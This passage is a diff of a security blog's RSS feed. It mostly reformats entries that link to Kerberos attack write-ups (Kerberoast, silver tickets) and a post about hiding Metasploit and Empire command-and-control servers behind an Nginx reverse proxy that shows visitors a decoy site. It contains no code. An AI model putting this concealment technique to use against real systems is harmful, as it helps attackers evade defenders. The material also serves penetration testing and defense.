+&lt;li&gt;Tim Medin&#39;s Slides - [Kicking the Guard Dog of Hades - slides](&lt;a href=&#34;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1&#34;&gt;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1&lt;/a&gt;).pdf)&lt;/li&gt;
+&lt;li&gt;Tim Medin&#39;s Video - &lt;a href=&#34;https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;amp;feature=youtu.be&#34;&gt;Kicking the Guard Dog of Hades - video&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
 &lt;h2 id=&#34;other-write-ups&#34;&gt;Other write ups&lt;/h2&gt;
-
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;http://malwarejake.blogspot.com/2015/11/kerberos-silver-tickets-unique-attacker.html&#34;&gt;Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Brute-Forcing_Service_Account_Passwords.html&#34;&gt;Ben Lincoln&amp;rsquo;s writeup on Brute Forcing Service Account Passwords&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/&#34;&gt;Leon Jacob&amp;rsquo;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?p=2293&#34;&gt;Sean Metcalf&amp;rsquo;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?page_id=183&#34;&gt;Sean Metcalf&amp;rsquo;s SPN directory&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Brute-Forcing_Service_Account_Passwords.html&#34;&gt;Ben Lincoln&#39;s writeup on Brute Forcing Service Account Passwords&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/&#34;&gt;Leon Jacob&#39;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?p=2293&#34;&gt;Sean Metcalf&#39;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?page_id=183&#34;&gt;Sean Metcalf&#39;s SPN directory&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
     </item>
@@ -673,23 +538,14 @@ MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                  
       <pubDate>Thu, 31 Dec 2015 16:28:07 -0500</pubDate>
       
       <guid>https://malicious.link/post/2015/reverse-proxying-attacker-tools/</guid>
-      <description>
-
-&lt;p&gt;Ever want to have all of your C2 go to the same box, have the functionality of Meterpreter, and Empire, while making it so if anyone goes to the actual site of your C2 all they get is something like Google?&lt;/p&gt;
-
-&lt;p&gt;Nginx makes that possible, and instead of making a blog post that will disappear, I&amp;rsquo;ll point you at my combo in my &amp;ldquo;Attacker Knowledge Base&amp;rdquo; site:&lt;/p&gt;
-
+      <description>&lt;p&gt;Ever want to have all of your C2 go to the same box, have the functionality of Meterpreter, and Empire, while making it so if anyone goes to the actual site of your C2 all they get is something like Google?&lt;/p&gt;
+&lt;p&gt;Nginx makes that possible, and instead of making a blog post that will disappear, I&#39;ll point you at my combo in my &amp;ldquo;Attacker Knowledge Base&amp;rdquo; site:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://attackerkb.com/Combinations/ReverseProxyAttackTools&#34;&gt;https://attackerkb.com/Combinations/ReverseProxyAttackTools&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;and instead, show you the results once it&amp;rsquo;s setup:&lt;/p&gt;
-
+&lt;p&gt;and instead, show you the results once it&#39;s setup:&lt;/p&gt;
 &lt;h3 id=&#34;metasploit&#34;&gt;Metasploit:&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/reverse_proxy_msf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/reverse_proxy_msf.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;empire&#34;&gt;Empire:&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/reverse_proxy_empire.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/reverse_proxy_empire.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 </description>
     </item>
     
